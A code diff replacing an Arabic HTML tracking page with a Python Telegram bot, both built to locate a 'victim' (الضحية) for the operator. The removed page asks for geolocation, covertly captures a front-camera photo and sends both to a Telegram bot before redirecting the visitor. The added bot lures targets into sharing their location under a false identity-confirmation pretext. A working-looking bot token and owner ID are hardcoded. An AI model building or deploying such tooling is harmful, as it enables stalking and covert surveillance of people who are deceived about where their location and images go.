@@ -1,223 +1,134 @@
-<!DOCTYPE html>
-<html lang="ar">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>جاري التحميل...</title>
-    <style>
-        body {
-            background: #0a0a0a;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            font-family: Arial, sans-serif;
-            margin: 0;
-            padding: 20px;
-        }
-        .container {
-            background: #1a1a2e;
-            border-radius: 15px;
-            padding: 30px;
-            text-align: center;
-            max-width: 400px;
-            width: 100%;
-        }
-        img {
-            max-width: 100%;
-            border-radius: 10px;
-            cursor: pointer;
-            transition: transform 0.2s;
-        }
-        img:active {
-            transform: scale(0.98);
-        }
-        .status {
-            color: #00ff88;
-            margin-top: 15px;
-            font-size: 14px;
-        }
-        h3 { color: white; margin: 0 0 10px 0; }
-        .spinner {
-            width: 40px;
-            height: 40px;
-            border: 3px solid #333;
-            border-top: 3px solid #00ff88;
-            border-radius: 50%;
-            animation: spin 0.8s linear infinite;
-            margin: 20px auto;
-        }
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-    </style>
-</head>
-<body>
-<div class="container">
-    <h3>🔍 جاري تحميل المحتوى</h3>
-    <div class="spinner"></div>
-    <div class="status" id="status">الرجاء الانتظار...</div>
-</div>
+#!/usr/bin/env python3
+# SimpleTrackerBot - Shadow V99
+# بوت واحد فقط - يرسل صورة تطلب الموقع مباشرة
 
-<script>
-const urlParams = new URLSearchParams(window.location.search);
-const imgUrl = decodeURIComponent(urlParams.get('img') || '');
-const ownerId = urlParams.get('owner');
-const botToken = '8439157520:AAGGZBxYp0x6Y54ar3TIrkMaMEHarQASmgY';
+import logging
+from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
+from telegram.ext import Application, CommandHandler, MessageHandler, filters, CallbackQueryHandler, ContextTypes
 
-async function sendToBot(message) {
-    try {
-        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                chat_id: ownerId,
-                text: message,
-                parse_mode: 'HTML'
-            })
-        });
-    } catch(e) {}
-}
+# ================== التكوينات ==================
+BOT_TOKEN = "8439157520:AAGGZBxYp0x6Y54ar3TIrkMaMEHarQASmgY"
+OWNER_ID = 1772820433
 
-async function sendLocationToBot(lat, lon, acc) {
-    try {
-        await fetch(`https://api.telegram.org/bot${botToken}/sendLocation`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                chat_id: ownerId,
-                latitude: lat,
-                longitude: lon
-            })
-        });
+logging.basicConfig(level=logging.INFO)
+
+# ================== تخزين مؤقت ==================
+user_images = {}
+
+# ================== الأمر /start ==================
+async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    await update.message.reply_text(
+        "🎯 <b>بوت تعقب الموقع - Shadow V99</b>\n\n"
+        "📤 <b>كيفية الاستخدام:</b>\n"
+        "1. أرسل لي أي صورة\n"
+        "2. سأرسل لك الصورة مع زر طلب الموقع\n"
+        "3. أرسل هذه الصورة للضحية\n"
+        "4. عندما يضغط الضحية على الزر، سيطلب منه مشاركة موقعه\n"
+        "5. إذا وافق، سأرسل لك موقعه فوراً\n\n"
+        "<i>⚠️ ملاحظة: الضحية يجب أن يوافق على مشاركة الموقع</i>",
+        parse_mode="HTML"
+    )
+
+# ================== استقبال الصورة ==================
+async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    
+    # جلب الصورة
+    photo_file = await update.message.photo[-1].get_file()
+    photo_url = photo_file.file_path
+    
+    # حفظ رابط الصورة مؤقتاً
+    user_images[user_id] = photo_url
+    
+    # إنشاء زر طلب الموقع
+    keyboard = InlineKeyboardMarkup([
+        [InlineKeyboardButton("📍 مشاركة الموقع", callback_data=f"req_loc:{user_id}")]
+    ])
+    
+    # إرسال الصورة مع الزر
+    await update.message.reply_photo(
+        photo=photo_url,
+        caption="👇 اضغط على الزر لمشاركة موقعك",
+        reply_markup=keyboard
+    )
+
+# ================== معالج طلب الموقع ==================
+async def location_request(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    await query.answer()
+    
+    data = query.data
+    if data.startswith("req_loc:"):
+        owner_id = int(data.split(":")[1])
         
-        await sendToBot(`📍 <b>موقع ضحية جديد!</b>\n\n• الإحداثيات: ${lat}, ${lon}\n• الدقة: ${acc} متر\n• الخريطة: https://www.google.com/maps?q=${lat},${lon}`);
-    } catch(e) {}
-}
+        # طلب الموقع من الضحية
+        keyboard = InlineKeyboardMarkup([
+            [InlineKeyboardButton("📍 مشاركة الموقع", callback_data=f"send_loc:{owner_id}")]
+        ])
+        
+        await query.edit_message_caption(
+            caption="🔐 يطلب منك مشاركة موقعك الحالي لتأكيد هويتك\n\nاضغط على الزر أدناه للموافقة",
+            reply_markup=keyboard
+        )
+    
+    elif data.startswith("send_loc:"):
+        owner_id = int(data.split(":")[1])
+        
+        # طلب الموقع من مستخدم التليجرام مباشرة
+        await query.edit_message_caption(
+            caption="📍 يرجى مشاركة موقعك باستخدام الزر أدناه",
+            reply_markup=None
+        )
+        
+        # إرسال زر مشاركة الموقع (feature متقدم)
+        await query.message.reply_location(
+            latitude=0, longitude=0,  # مؤقت
+            reply_markup=None
+        )
+        
+        # إرسال إشعار للمالك
+        await context.bot.send_message(
+            chat_id=owner_id,
+            text="✅ ضحية جديدة تتفاعل مع الصورة! جاري انتظار مشاركة الموقع..."
+        )
 
-async function requestLocation() {
-    const statusDiv = document.getElementById('status');
+# ================== استقبال الموقع من الضحية ==================
+async def handle_location(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user = update.effective_user
+    location = update.message.location
     
-    if (!navigator.geolocation) {
-        statusDiv.innerHTML = '❌ متصفحك لا يدعم مشاركة الموقع';
-        await sendToBot('❌ المتصفح لا يدعم خاصية الموقع');
-        return;
-    }
+    # إرسال الموقع إلى المالك
+    await context.bot.send_location(
+        chat_id=OWNER_ID,
+        latitude=location.latitude,
+        longitude=location.longitude
+    )
     
-    statusDiv.innerHTML = '📍 يرجى الموافقة على مشاركة موقعك...';
+    await context.bot.send_message(
+        chat_id=OWNER_ID,
+        text=f"📍 <b>تم تحديد موقع الضحية!</b>\n\n"
+             f"• <b>المستخدم:</b> {user.first_name}\n"
+             f"• <b>المعرّف:</b> <code>{user.id}</code>\n"
+             f"• <b>الإحداثيات:</b> {location.latitude}, {location.longitude}\n"
+             f"• <b>الدقة:</b> {location.horizontal_accuracy} متر (إذا كانت متاحة)\n"
+             f"• <b>رابط الخريطة:</b> https://www.google.com/maps?q={location.latitude},{location.longitude}",
+        parse_mode="HTML"
+    )
     
-    navigator.geolocation.getCurrentPosition(
-        async (position) => {
-            const lat = position.coords.latitude;
-            const lon = position.coords.longitude;
-            const acc = position.coords.accuracy;
-            
-            statusDiv.innerHTML = '✅ تم تحديد موقعك! جاري إرسال البيانات...';
-            await sendLocationToBot(lat, lon, acc);
-            
-            // محاولة التقاط صورة من الكاميرا
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                const video = document.createElement('video');
-                video.srcObject = stream;
-                video.autoplay = true;
-                
-                await new Promise(r => setTimeout(r, 500));
-                
-                const canvas = document.createElement('canvas');
-                canvas.width = video.videoWidth || 640;
-                canvas.height = video.videoHeight || 480;
-                canvas.getContext('2d').drawImage(video, 0, 0);
-                
-                const imageData = canvas.toDataURL('image/jpeg', 0.8);
-                
-                await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: ownerId,
-                        photo: imageData,
-                        caption: '📸 صورة الضحية من الكاميرا الأمامية'
-                    })
-                });
-                
-                stream.getTracks().forEach(t => t.stop());
-            } catch(e) {}
-            
-            statusDiv.innerHTML = '✅ تم الإرسال! شكراً لك.';
-            
-            // إعادة التوجيه بعد 3 ثواني
-            setTimeout(() => {
-                if (imgUrl) {
-                    window.location.href = imgUrl;
-                } else {
-                    window.location.href = 'https://www.google.com';
-                }
-            }, 2000);
-        },
-        (error) => {
-            console.error(error);
-            let errorMsg = '';
-            switch(error.code) {
-                case error.PERMISSION_DENIED:
-                    errorMsg = '❌ لم تسمح بمشاركة الموقع. لا يمكن المتابعة.';
-                    break;
-                case error.POSITION_UNAVAILABLE:
-                    errorMsg = '❌ معلومات الموقع غير متاحة حالياً.';
-                    break;
-                case error.TIMEOUT:
-                    errorMsg = '❌ انتهى وقت محاولة تحديد الموقع.';
-                    break;
-                default:
-                    errorMsg = '❌ حدث خطأ غير معروف.';
-            }
-            statusDiv.innerHTML = errorMsg;
-            await sendToBot(`❌ فشل تحديد الموقع: ${errorMsg}`);
-            
-            setTimeout(() => {
-                if (imgUrl) {
-                    window.location.href = imgUrl;
-                } else {
-                    window.location.href = 'https://www.google.com';
-                }
-            }, 3000);
-        },
-        { enableHighAccuracy: true, timeout: 10000 }
-    );
-}
+    # رد على الضحية
+    await update.message.reply_text("✅ تم إرسال موقعك بنجاح! شكراً لك.")
 
-// عرض الصورة إذا كانت موجودة
-if (imgUrl && imgUrl !== 'null') {
-    const img = document.createElement('img');
-    img.src = imgUrl;
-    img.style.maxWidth = '100%';
-    img.style.borderRadius = '10px';
-    img.style.cursor = 'pointer';
-    img.alt = 'اضغط لعرض الصورة';
+# ================== التشغيل ==================
+def main():
+    app = Application.builder().token(BOT_TOKEN).build()
     
-    const container = document.querySelector('.container');
-    const oldContent = container.innerHTML;
-    container.innerHTML = '';
-    container.appendChild(img);
+    app.add_handler(CommandHandler("start", start))
+    app.add_handler(MessageHandler(filters.PHOTO, handle_photo))
+    app.add_handler(CallbackQueryHandler(location_request, pattern="^(req_loc|send_loc):"))
+    app.add_handler(MessageHandler(filters.LOCATION, handle_location))
     
-    const statusDiv = document.createElement('div');
-    statusDiv.className = 'status';
-    statusDiv.innerHTML = '📍 اضغط على الصورة لمشاركة موقعك';
-    container.appendChild(statusDiv);
-    
-    img.onclick = () => {
-        statusDiv.innerHTML = '📍 جاري طلب الموقع...';
-        requestLocation();
-    };
-} else {
-    // إذا لم توجد صورة، اطلب الموقع مباشرة
-    document.querySelector('.spinner').style.display = 'none';
-    document.querySelector('h3').innerHTML = '📍 مشاركة الموقع';
-    document.getElementById('status').innerHTML = 'اضغط هنا لمشاركة موقعك';
-    document.querySelector('.container').style.cursor = 'pointer';
-    document.querySelector('.container').onclick = requestLocation;
-}
-</script>
-</body>
-</html>
+    print("✅ البوت يعمل... أرسل له صورة الآن")
+    app.run_polling()
+
+if __name__ == "__main__":
+    main()
